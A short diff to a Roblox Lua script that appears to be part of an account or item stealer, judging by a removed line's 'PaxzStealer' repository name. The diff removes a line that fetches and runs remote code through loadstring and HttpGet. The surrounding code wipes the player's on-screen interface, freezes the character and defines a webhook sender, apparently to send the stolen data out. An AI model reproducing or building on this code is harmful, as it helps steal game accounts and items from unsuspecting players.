@@ -5,9 +5,9 @@ for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
     v:Destroy()
 end
 
-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 0
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()
 
 function sendWebhook(webhook, message)
     local webhookcheck =
